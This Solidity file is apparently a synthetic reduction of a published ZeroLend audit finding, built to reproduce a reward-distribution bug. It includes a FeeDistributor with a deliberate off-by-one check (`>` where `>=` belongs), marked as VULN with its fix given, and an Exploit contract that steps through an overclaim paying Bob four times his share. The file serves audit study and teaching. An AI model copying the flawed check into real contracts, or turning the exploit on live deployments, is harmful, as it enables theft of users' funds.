// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ZeroLend — Incorrect reward distribution when t == roundedTimestamp
    (0xarno / Cantina Jan 2024, finding #40820)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: FeeDistributor._checkpointTotalSupply loops with
    `if (t > roundedTimestamp) break;` so when t == roundedTimestamp (epoch
    boundary) it STILL writes veSupply[t] from the current locker point. A later
    lock in the same epoch changes real supply, but veSupply[epoch] stays stale —
    claims use totalReward * balance / supply with the wrong supply, overpaying
    late lockers (Bob gets 3 instead of 3/4 of the epoch reward).

    Vulnerable comparison preserved with @> VULN.
    FIX: `if (t >= roundedTimestamp) break;` (do not write the incomplete week). */

library Math {
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }
}

contract MockReward {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal ZeroLocker surface used by FeeDistributor checkpointing.
contract ZeroLocker {
    struct Point {
        int128 bias;
        int128 slope;
        uint256 ts;
        uint256 blk;
    }

    uint256 public epoch;
    mapping(uint256 => Point) public pointHistory;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor() {
        // genesis point
        pointHistory[0] = Point({bias: 0, slope: 0, ts: 0, blk: 0});
    }

    function checkpoint() external {
        // no-op for synthetic (point already current)
    }

    /// @dev Create/increase a lock — bias = amount (no decay for the short demo).
    function lock(address user, uint256 amount) external {
        balanceOf[user] += amount;
        totalSupply += amount;
        epoch += 1;
        pointHistory[epoch] =
            Point({bias: int128(int256(totalSupply)), slope: 0, ts: block.timestamp, blk: block.number});
    }
}

/// @notice Reduced FeeDistributor — week-bound veSupply checkpoint + claim.
contract FeeDistributor {
    uint256 public constant WEEK = 7 days;

    ZeroLocker public locker;
    MockReward public rewardToken;
    mapping(uint256 => uint256) public veSupply;
    uint256 public timeCursor;

    // Simple reward pot for one epoch claim demo
    mapping(uint256 => uint256) public tokensPerWeek; // week start => reward
    mapping(address => uint256) public claimed;

    constructor(ZeroLocker locker_, MockReward reward_) {
        locker = locker_;
        rewardToken = reward_;
        // Start at week 0 so the first checkpoint can hit t == roundedTimestamp.
        timeCursor = 0;
    }

    function depositReward(uint256 weekStart, uint256 amount) external {
        tokensPerWeek[weekStart] += amount;
    }

    function checkpointTotalSupply(uint256 timestamp) external {
        _checkpointTotalSupply(timestamp);
    }

    function _checkpointTotalSupply(uint256 timestamp) internal {
        uint256 t = timeCursor;
        uint256 roundedTimestamp = (timestamp / WEEK) * WEEK;
        locker.checkpoint();
        for (uint256 index = 0; index < 20; index++) {
            // FIX: if (t >= roundedTimestamp) break;  (do not write incomplete week)
            if (t > roundedTimestamp) { // @> VULN: `>` still writes veSupply when t == roundedTimestamp
                break;
            } else {
                // Simplified point fetch (public mapping getter returns a tuple).
                (int128 bias, int128 slope, uint256 pts,) = locker.pointHistory(locker.epoch());
                int128 dt = 0;
                if (t > pts) dt = int128(uint128(t - pts));
                int256 biased = int256(bias) - int256(slope) * int256(dt);
                if (biased < 0) biased = 0;
                veSupply[t] = uint256(uint128(int128(biased)));
                // If point is empty at t==0 and supply already set via lock, use totalSupply.
                if (veSupply[t] == 0 && locker.totalSupply() > 0) {
                    veSupply[t] = locker.totalSupply();
                }
            }
            t += WEEK;
        }
        timeCursor = t;
    }

    /// @dev Claim share of week rewards: totalReward * balance / veSupply[week].
    function claim(address user, uint256 weekStart) external returns (uint256 amount) {
        uint256 supply = veSupply[weekStart];
        require(supply > 0, "no supply checkpoint");
        uint256 bal = locker.balanceOf(user);
        uint256 totalReward = tokensPerWeek[weekStart];
        amount = (totalReward * bal) / supply;
        tokensPerWeek[weekStart] = 0; // single claim demo
        claimed[user] += amount;
        // Pay from this contract's reward balance (pre-funded oversized pot so overpay succeeds).
        rewardToken.transfer(user, amount);
    }
}

contract Alice {
    function lock(ZeroLocker locker, uint256 amt) external {
        locker.lock(address(this), amt);
    }
}

contract Bob {
    function lock(ZeroLocker locker, uint256 amt) external {
        locker.lock(address(this), amt);
    }

    function checkpoint(FeeDistributor fd, uint256 ts) external {
        fd.checkpointTotalSupply(ts);
    }

    function claim(FeeDistributor fd, uint256 week) external returns (uint256) {
        return fd.claim(address(this), week);
    }
}

contract Exploit {
    ZeroLocker public locker; // 1
    MockReward public reward; // 2
    FeeDistributor public fd; // 3 — vulnerable
    Alice public alice; // 4
    Bob public bob; // 5

    uint256 public constant WEEK = 7 days;
    uint256 public constant REWARD = 1 ether; // totalReward for the epoch accounting

    constructor() {
        locker = new ZeroLocker();
        reward = new MockReward();
        fd = new FeeDistributor(locker, reward);
        alice = new Alice();
        bob = new Bob();
        // Oversized pot so Bob's 3-ether overclaim can be paid.
        reward.mint(address(fd), 10 ether);
    }

    function run() external {
        // Epoch boundary: timestamp == 0 is already a week start in the synthetic
        // (timeCursor starts at 0; we checkpoint at ts=0 so roundedTimestamp=0).
        uint256 ts = 0;
        uint256 weekStart = 0;

        // 1) Alice locks 100 — supply = 100.
        alice.lock(locker, 100 ether);
        require(locker.totalSupply() == 100 ether, "alice supply");

        // 2) Bob checkpoints at the exact epoch boundary (t == roundedTimestamp).
        //    Vulnerable loop WRITES veSupply[0] = 100 (with fix `>=` it would skip).
        bob.checkpoint(fd, ts);
        require(fd.veSupply(weekStart) == 100 ether, "premature veSupply write");

        // 3) Bob locks 300 — real supply = 400, but veSupply[week] stays 100.
        bob.lock(locker, 300 ether);
        require(locker.totalSupply() == 400 ether, "total 400");
        require(fd.veSupply(weekStart) == 100 ether, "stale supply checkpoint");

        // Fund the epoch reward pot (1 ether total).
        fd.depositReward(weekStart, REWARD);

        // 4) Bob claims: reward = 1e18 * 300e18 / 100e18 = 3e18 (WRONG).
        //    Correct with supply 400: 1e18 * 300/400 = 0.75e18.
        uint256 bobBefore = reward.balanceOf(address(bob));
        uint256 bobReward = bob.claim(fd, weekStart);
        require(bobReward == 3 ether, "expected overpay 3 ether");
        // Honest share would be 0.75 ether — overpay factor 4x.
        require(bobReward > (REWARD * 300) / 400, "not overpaid vs honest share");
        require(fd.claimed(address(bob)) == 3 ether, "claimed marker");
        require(reward.balanceOf(address(bob)) == bobBefore + 3 ether, "bob paid in RWD");
    }
}
